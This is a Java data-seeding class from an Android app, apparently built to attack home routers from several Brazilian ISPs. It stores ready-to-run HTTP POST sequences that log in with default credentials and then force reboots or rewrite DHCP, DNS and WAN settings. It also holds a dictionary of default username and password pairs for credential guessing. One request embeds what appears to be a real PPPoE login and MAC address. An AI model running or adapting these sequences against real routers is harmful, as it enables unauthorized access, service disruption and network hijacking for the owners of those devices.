package br.pedrofreitas.myroutertestapp.dao;

import android.content.Context;
import br.pedrofreitas.myroutertestapp.manager.Ataque;
import br.pedrofreitas.myroutertestapp.manager.Login;
import br.pedrofreitas.myroutertestapp.manager.Params;
import br.pedrofreitas.myroutertestapp.manager.PostGet;

public class Initialize {
	
	private Context mContext;
	
	private GeneralDao mGeneralDao;
	private DadoDao mDadoDao;
	private AtaqueDao mAtaqueDao;
	private PostGetDao mPostGetDao;
	private ParamsDao mParamsDao;
	private UsuarioDao mUsuarioDao;
	
	public Initialize(Context mContext) {
		this.mContext = mContext;
	}
	
	public void execute() {
		mGeneralDao = new GeneralDao(mContext);
		mDadoDao = new DadoDao(mContext);
		mAtaqueDao = new AtaqueDao(mContext);
		mPostGetDao = new PostGetDao(mContext);
		mParamsDao = new ParamsDao(mContext);         
		mUsuarioDao = new UsuarioDao(mContext);		
		/* Para teste! COMENTAR!! */
		insertAll();
		selectAll();
		/********************/
	}

	public void insertAll() {
//		Oi ZyXEL AMG1202-T10B
		mAtaqueDao.insert(new Ataque(1, "reboot", null, "oi", 0, 0, 1, null, null, 0));			
		mPostGetDao.insert(new PostGet(1, 1, 1, "post", "/cgi-bin/SavingAuthorize.asp"));														
			mParamsDao.insert(new Params(1, 1, "LoginPassword", "admin"));
			mParamsDao.insert(new Params(2, 1, "LoginUsername", "admin"));
		mPostGetDao.insert(new PostGet(2, 1, 2, "post", "/cgi-bin/RebootSucc.asp"));
			mParamsDao.insert(new Params(3, 2, "LoginPassword", "admin"));
			mParamsDao.insert(new Params(4, 2, "LoginUsername", "admin"));
			
//		Oi technicolor TD5136v2	
		mAtaqueDao.insert(new Ataque(2, "reboot", null, "oi", 0, 0, 1, null, null, 0));			
		mPostGetDao.insert(new PostGet(3, 2, 1, "post", "/login.cgi"));
			mParamsDao.insert(new Params(5, 3, "isSubmit", "1"));
			mParamsDao.insert(new Params(6, 3, "username", "admin"));
			mParamsDao.insert(new Params(7, 3, "password", "admin"));
		mPostGetDao.insert(new PostGet(4, 2, 2, "post", "/reboot.cgi"));
			mParamsDao.insert(new Params(8, 4, "submitValue", "redirect"));
		mPostGetDao.insert(new PostGet(5, 2, 3, "post", "/reboot.cgi"));
			mParamsDao.insert(new Params(9, 5, "submitValue", "apply"));			
	
//		GVT D-Link DSL-2640B	
		mAtaqueDao.insert(new Ataque(3, "reboot", "/rebootinfo.cgi", "gvt", 0, 0, 0, null, null, 0));			
	
//		NET Cisco DPC3925
		mAtaqueDao.insert(new Ataque(4, "reboot", null, "net", 0, 0, 1, null, null, 0));			
		mPostGetDao.insert(new PostGet(6, 4, 1, "post", "/goform/Docsis_system"));														
			mParamsDao.insert(new Params(10, 6, "username_login", ""));
			mParamsDao.insert(new Params(11, 6, "password_login", ""));
			mParamsDao.insert(new Params(12, 6, "LanguageSelect", "en"));
			mParamsDao.insert(new Params(13, 6, "Language_Submit", "0"));
			mParamsDao.insert(new Params(14, 6, "login", "0"));
		mPostGetDao.insert(new PostGet(7, 4, 2, "post", "/goform/Devicerestart"));
			mParamsDao.insert(new Params(15, 7, "devicerestrat_Password_check", ""));
			mParamsDao.insert(new Params(16, 7, "mtenRestore", "Device Restart"));
			mParamsDao.insert(new Params(17, 7, "devicerestart", "1"));
			mParamsDao.insert(new Params(18, 7, "devicerestrat_getUsercheck", "true"));
		
//		Oi ZyXEL AMG1202-T10B	
		mAtaqueDao.insert(new Ataque(5, "dns", null, "oi", 0, 0, 1, null, null, 0));			 
		mPostGetDao.insert(new PostGet(8, 5, 1, "post", "/cgi-bin/SavingAuthorize.asp"));
			mParamsDao.insert(new Params(19, 8, "LoginPassword", "admin"));
			mParamsDao.insert(new Params(20, 8, "LoginUsername", "admin"));
		mPostGetDao.insert(new PostGet(9, 5, 2, "post", "/cgi-bin/LAN_DHCPSetup.asp"));
			mParamsDao.insert(new Params(21, 9, "IPAliasExist", "Yes"));
			mParamsDao.insert(new Params(22, 9, "IPAlias1Addr", "192.168.2.1"));
			mParamsDao.insert(new Params(23, 9, "IPAlias1SubnetMask", "255.255.255.0"));
			mParamsDao.insert(new Params(24, 9, "DNSdefaultValue1", "168.95.1.1"));
			mParamsDao.insert(new Params(25, 9, "DNSdefaultValue2", "168.95.1.2"));
			mParamsDao.insert(new Params(26, 9, "DHCP_Mode", "1"));
			mParamsDao.insert(new Params(27, 9, "sysPoolStartingAddr", "192.168.1.33"));
			mParamsDao.insert(new Params(28, 9, "ipAddrMain", "192.168.1.1"));
			mParamsDao.insert(new Params(29, 9, "subnetMask", "255.255.255.0"));
			mParamsDao.insert(new Params(30, 9, "sysPoolCount", "32"));
			mParamsDao.insert(new Params(31, 9, "DNSproxyType", "1"));
			mParamsDao.insert(new Params(32, 9, "DHCPPriDNSAddr", "8.8.8.8"));
			mParamsDao.insert(new Params(33, 9, "DHCPSecDNSAddr", "8.8.4.4"));
			mParamsDao.insert(new Params(34, 9, "DNSproxy", "Yes"));
			mParamsDao.insert(new Params(35, 9, "LAN_DHCPFlag", "1"));
		mPostGetDao.insert(new PostGet(10, 5, 3, "post", "/cgi-bin/RebootSucc.asp"));
			mParamsDao.insert(new Params(36, 10, "LoginPassword", "admin"));
			mParamsDao.insert(new Params(37, 10, "LoginUsername", "admin"));	
				
//		Oi technicolor TD5136v2	
		mAtaqueDao.insert(new Ataque(6, "dns", null, "oi", 0, 0, 1, null, null, 0));			
		mPostGetDao.insert(new PostGet(11, 6, 1, "post", "/login.cgi"));
			mParamsDao.insert(new Params(38, 11, "isSubmit", "1"));
			mParamsDao.insert(new Params(39, 11, "username", "admin"));
			mParamsDao.insert(new Params(40, 11, "password", "admin"));
		mPostGetDao.insert(new PostGet(12, 6, 2, "post", "/wancfg.cgi?tAction=apply&idx=0&natEnable=1&defaultRoute=1&icmpReply=0&proxyArp=0&dnsEnable=1&dns1=8.8.8.8&dns2=8.8.4.4&PPP_ConnectionTrigger_value=0&dnsOveride=0&state=1&ipVer=0&ipMode=1&srvName=WAN1&wanIpAddr=0.0.0.0&wanSubnet=0.0.0.0&wanMode=1&wanMac=&unnumberMode=0&Profile_Name=PVC0&pvcId=0&DSL_Enable=1&DSL_AutoPVCEnabled=1&DSL_VPI=0&DSL_VCI=33&DSL_LinkType=0&DSL_Encapsulation=1&DSL_ATMQoS=0&DSL_ATMPeakCellRate=6000&DSL_ATMMaxmumBurstSize=0&DSL_ATMSustainableCellRate=0&DSL_EnableVlan=0&DSL_DefaultVlanID=-1&DSL_DefaultPriority=-1&bridgeType=2&igmpEnabled=0&mode=1&PPP_Enable=1&PPP_IPversion=0&PPP_IPMode=1&PPP_IPAddress=0.0.0.0&PPP_Name=WAN1&PPP_NATEnabled=1&PPP_UserName=B0C287467712@oivelox&PPP_UserPassword=B0C287467712&PPP_ConfirmPassword=B0C287467712&PPP_MaxMRUSize=1492&PPP_DNSEnabled=1&PPP_DNSOverrideAllowed=0&PPP_DNSServer1=8.8.8.8&PPP_DNSServer2=8.8.4.4&PPP_PPPoEServiceName=&PPP_MACAddress1=B0&PPP_MACAddress2=C2&PPP_MACAddress3=87&PPP_MACAddress4=46&PPP_MACAddress5=77&PPP_MACAddress6=12&PPP_PPPoEACName=&PPP_LCP_Interval=10&PPP_DefaultRoute=0&IP_Enable=1&IP_IPversion=0&IP_Name=WAN1&IP_ConnectionType=2&IP_NATEnabled=1&IP_AddressingType=1&IP_ExternalIPAddress=0.0.0.0&IP_SubNetMask=0.0.0.0&IP_DefaultGateway=0.0.0.0&IP_DNSEnabled=0&IP_DNSOverrideAllowed=0&IP_MaxMTUSize=1492&IP_MACAddress1=B0&IP_MACAddress2=C2&IP_MACAddress3=87&IP_MACAddress4=46&IP_MACAddress5=77&IP_MACAddress6=12&IP_Option_125=0&IP_Option_60_Vendor_ID=&IP_Option_61_IAID=&IP_Option_61_DUID=&IP_DefaultRoute=0"));
		mPostGetDao.insert(new PostGet(13, 6, 3, "post", "/reboot.cgi"));
			mParamsDao.insert(new Params(41, 13, "submitValue", "redirect"));					

//		GVT D-Link DSL-2640B	
		mAtaqueDao.insert(new Ataque(7, "dns", null, "gvt", 0, 0, 1, null, null, 0));			
		mPostGetDao.insert(new PostGet(14, 7, 1, "post", "/dnscfg.cgi?dnsPrimary=8.8.8.8&dnsSecondary=8.8.4.4&dnsIfc=&dnsRefresh=1"));
		mPostGetDao.insert(new PostGet(15, 7, 2, "post", "/dnscfg.cgi?dnsRefresh=0"));
		mPostGetDao.insert(new PostGet(16, 7, 3, "post", "/rebootinfo.cgi"));	
			
//		NET Cisco DPC3925
		mAtaqueDao.insert(new Ataque(8, "dns", null, "net", 0, 0, 1, null, null, 0));					
		mPostGetDao.insert(new PostGet(17, 8, 1, "post", "/goform/Docsis_system"));														
			mParamsDao.insert(new Params(42, 17, "username_login", ""));
			mParamsDao.insert(new Params(43, 17, "password_login", ""));
			mParamsDao.insert(new Params(44, 17, "LanguageSelect", "en"));
			mParamsDao.insert(new Params(45, 17, "Language_Submit", "0"));
			mParamsDao.insert(new Params(46, 17, "login", "0"));
		mPostGetDao.insert(new PostGet(18, 8, 2, "post", "/goform/LanSetup"));
			mParamsDao.insert(new Params(47, 18, "CiscoLocalIpAddressIP2", "0"));
			mParamsDao.insert(new Params(48, 18, "CiscoLocalIpAddressIP3", "1"));
			mParamsDao.insert(new Params(49, 18, "CiscoLocalNetmaskIP3", "0"));		
			mParamsDao.insert(new Params(50, 18, "CiscoIsLocalIPSettingByGUI", "1"));
			mParamsDao.insert(new Params(51, 18, "CiscoIsDefaultIP", "1"));
			mParamsDao.insert(new Params(52, 18, "CiscoDhcpServer", "1"));
			mParamsDao.insert(new Params(53, 18, "CiscoStartingLocalAddressIP2", "0"));
			mParamsDao.insert(new Params(54, 18, "CiscoStartingLocalAddressIP3", "10"));
			mParamsDao.insert(new Params(55, 18, "CiscoNumberOfCpes", "119"));
			mParamsDao.insert(new Params(56, 18, "CiscoLeaseTime", "60"));
			mParamsDao.insert(new Params(57, 18, "CiscoPrimaryDnsIpAddressIP0", "8"));
			mParamsDao.insert(new Params(58, 18, "CiscoPrimaryDnsIpAddressIP1", "8"));
			mParamsDao.insert(new Params(59, 18, "CiscoPrimaryDnsIpAddressIP2", "8"));
			mParamsDao.insert(new Params(60, 18, "CiscoPrimaryDnsIpAddressIP3", "8"));
			mParamsDao.insert(new Params(61, 18, "CiscoSecondaryDnsIpAddressIP0", "8"));
			mParamsDao.insert(new Params(62, 18, "CiscoSecondaryDnsIpAddressIP1", "8"));
			mParamsDao.insert(new Params(63, 18, "CiscoSecondaryDnsIpAddressIP2", "4"));
			mParamsDao.insert(new Params(64, 18, "CiscoSecondaryDnsIpAddressIP3", "4"));
			mParamsDao.insert(new Params(65, 18, "CiscoTertiaryDnsIpAddressIP0", "0"));
			mParamsDao.insert(new Params(66, 18, "CiscoTertiaryDnsIpAddressIP1", "0"));
			mParamsDao.insert(new Params(67, 18, "CiscoTertiaryDnsIpAddressIP2", "0"));
			mParamsDao.insert(new Params(68, 18, "CiscoTertiaryDnsIpAddressIP3", "0"));
			mParamsDao.insert(new Params(69, 18, "CiscoTimeZone", "25"));
			mParamsDao.insert(new Params(70, 18, "DaylightSavingMinutes", "0"));
			mParamsDao.insert(new Params(71, 18, "h_DaylightSavingEnable", "disable"));
			mParamsDao.insert(new Params(72, 18, "NewNtpTimeServer", ""));
			mParamsDao.insert(new Params(73, 18, "addNtpServer", "0"));
			mParamsDao.insert(new Params(74, 18, "removeNtpServer", "0"));
			mParamsDao.insert(new Params(75, 18, "TimeSntpEnable", "1"));
			mParamsDao.insert(new Params(76, 18, "save", "Save Settings"));
			mParamsDao.insert(new Params(77, 18, "CiscoApplyRgSetupAction", "1"));
		mPostGetDao.insert(new PostGet(19, 8, 3, "post", "/goform/Devicerestart"));
			mParamsDao.insert(new Params(78, 19, "devicerestrat_Password_check", ""));
			mParamsDao.insert(new Params(79, 19, "mtenRestore", "Device Restart"));
			mParamsDao.insert(new Params(80, 19, "devicerestart", "1"));
			mParamsDao.insert(new Params(81, 19, "devicerestrat_getUsercheck", "true"));		
	
		mUsuarioDao.insert(new Login(1, "admin", "admin", "oi"));
		mUsuarioDao.insert(new Login(2, "", "", "net"));
		mUsuarioDao.insert(new Login(3, "admin", "", "oi"));
		mUsuarioDao.insert(new Login(4, "admin", "1234", "oi"));
		mUsuarioDao.insert(new Login(5, "admin", "gvt12345", "gvt"));
		mUsuarioDao.insert(new Login(6, "admin", "motorola", "net"));
		mUsuarioDao.insert(new Login(7, "router", "router", "net"));
		mUsuarioDao.insert(new Login(8, "cablecom", "router", "net"));
		mUsuarioDao.insert(new Login(9, "", "admin", "oi"));
		mUsuarioDao.insert(new Login(10, "", "Wireless", "oi"));
		mUsuarioDao.insert(new Login(11, "Admin", "Admin", "oi"));
		mUsuarioDao.insert(new Login(12, "Admin", "", "oi"));
		mUsuarioDao.insert(new Login(13, "", "Admin", "oi"));
		mUsuarioDao.insert(new Login(14, "Administrator", "Administrator", "oi"));
		mUsuarioDao.insert(new Login(15, "Administrator", "", "oi"));
		mUsuarioDao.insert(new Login(16, "", "Adminstrator", "oi"));
		mUsuarioDao.insert(new Login(17, "root", "root", "oi"));
		mUsuarioDao.insert(new Login(18, "root", "", "oi"));
		mUsuarioDao.insert(new Login(19, "", "root", "oi"));
		mUsuarioDao.insert(new Login(20, "admin", "password", "net"));
		mUsuarioDao.insert(new Login(21, "", "1234", "oi"));
		
	}
	
	public void selectAll() {
		mAtaqueDao.getAll();
		
		mPostGetDao.getPostEGetWithIdAtaque(1);
		mPostGetDao.getPostEGetWithIdAtaque(2);
		mPostGetDao.getPostEGetWithIdAtaque(3);
		mPostGetDao.getPostEGetWithIdAtaque(4);
		mPostGetDao.getPostEGetWithIdAtaque(5);
		mPostGetDao.getPostEGetWithIdAtaque(6);
		mPostGetDao.getPostEGetWithIdAtaque(7);
		mPostGetDao.getPostEGetWithIdAtaque(8);
		
		mParamsDao.getParamsWithIdComando(1);
		mParamsDao.getParamsWithIdComando(2);
		mParamsDao.getParamsWithIdComando(3);
		mParamsDao.getParamsWithIdComando(4);
		mParamsDao.getParamsWithIdComando(5);
		mParamsDao.getParamsWithIdComando(6);
		mParamsDao.getParamsWithIdComando(7);
		mParamsDao.getParamsWithIdComando(8);
		mParamsDao.getParamsWithIdComando(9);
		mParamsDao.getParamsWithIdComando(10);
		mParamsDao.getParamsWithIdComando(11);
		mParamsDao.getParamsWithIdComando(12);
		mParamsDao.getParamsWithIdComando(13);
		mParamsDao.getParamsWithIdComando(14);
		mParamsDao.getParamsWithIdComando(15);
		mParamsDao.getParamsWithIdComando(16);
		mParamsDao.getParamsWithIdComando(17);
		mParamsDao.getParamsWithIdComando(18);
		mParamsDao.getParamsWithIdComando(19);	
		
		mUsuarioDao.getLoginPorOperadora("oi");
		mUsuarioDao.getLoginPorOperadora("gvt");
		mUsuarioDao.getLoginPorOperadora("net");		
	}		
	
	
}
